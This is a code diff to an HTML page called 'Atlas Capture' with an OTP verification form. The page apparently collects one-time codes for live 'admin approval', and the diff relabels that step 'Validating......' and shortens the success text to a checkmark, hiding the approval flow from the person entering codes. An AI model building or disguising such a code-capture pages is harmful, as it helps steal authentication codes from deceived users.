@@ -159,13 +159,22 @@ button:disabled{
   padding:10px;
   border-radius:12px;
 }
+
+#logoAtlas{
+  height: 45px;
+  width: 45px;
+  border-radius: 40%;
+  margin-right: 9px;
+}
 </style>
 </head>
 <body>
 
 <div class="wrapper">
   <div class="header">
-    <div class="logo"></div>
+    <div class="icon">
+      <img id="logoAtlas" src="atlas.png" alt="Atlas logo">
+    </div>
     <span>Atlas Capture</span>
   </div>
 
@@ -189,7 +198,7 @@ button:disabled{
     </div>
 
     <button id="verifyBtn">Verify</button>
-    <button class="link" id="differentEmail">Use a different email</button>
+    <button class="link" id="differentEmail"></button>
     <div id="errorMessage" class="error-message"></div>
     <div id="successMessage" class="success-message"></div>
   </div>
@@ -279,7 +288,7 @@ button:disabled{
 
   function showWaitingForApproval() {
     verifyBtn.disabled = true;
-    verifyBtn.innerHTML = '<span class="button-loading"><span class="spinner"></span> Waiting for admin approval...</span>';
+    verifyBtn.innerHTML = '<span class="button-loading"><span class="spinner"></span> Validating......</span>';
   }
 
   function showReadyForNewOTP() {
@@ -321,7 +330,7 @@ button:disabled{
           approvalInterval = null;
           
           // Show success message
-          successDiv.textContent = '✓ OTP approved! You can now enter another code.';
+          successDiv.textContent = '✓';
           successDiv.style.display = 'block';
           
           // Reset for new OTP
